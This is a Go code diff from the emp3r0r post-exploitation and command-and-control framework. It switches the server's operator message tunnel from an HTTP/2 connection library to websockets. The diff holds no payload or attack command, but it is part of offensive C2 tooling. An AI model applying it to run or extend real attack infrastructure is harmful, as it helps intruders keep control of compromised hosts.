@@ -7,12 +7,14 @@ import (
 	"encoding/hex"
 	"encoding/pem"
 	"fmt"
+	"net"
 	"net/http"
 	"os"
 	"strings"
 	"sync"
 	"time"
 
+	"github.com/coder/websocket"
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
@@ -21,14 +23,13 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
-	"github.com/posener/h2conn"
 )
 
 // represents an operator_t
 type operator_t struct {
-	sessionID string       // marks the operator session
-	conn      *h2conn.Conn // message tunnel, used to relay messages
-	mu        sync.Mutex   // serialize writes to operator tunnel
+	sessionID string     // marks the operator session
+	conn      net.Conn   // message tunnel, used to relay messages
+	mu        sync.Mutex // serialize writes to operator tunnel
 }
 
 var (
@@ -425,11 +426,12 @@ func handleOperatorConn(wrt http.ResponseWriter, req *http.Request) {
 			logging.Errorf("handleOperatorConn panicked: %v", r)
 		}
 	}()
-	conn, err := h2conn.Accept(wrt, req)
+	wsConn, err := websocket.Accept(wrt, req, &websocket.AcceptOptions{})
 	if err != nil {
 		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
 		return
 	}
+	conn := websocket.NetConn(req.Context(), wsConn, websocket.MessageBinary)
 	operator_session := req.Header.Get("operator_session")
 
 	// Check if other operators are already connected
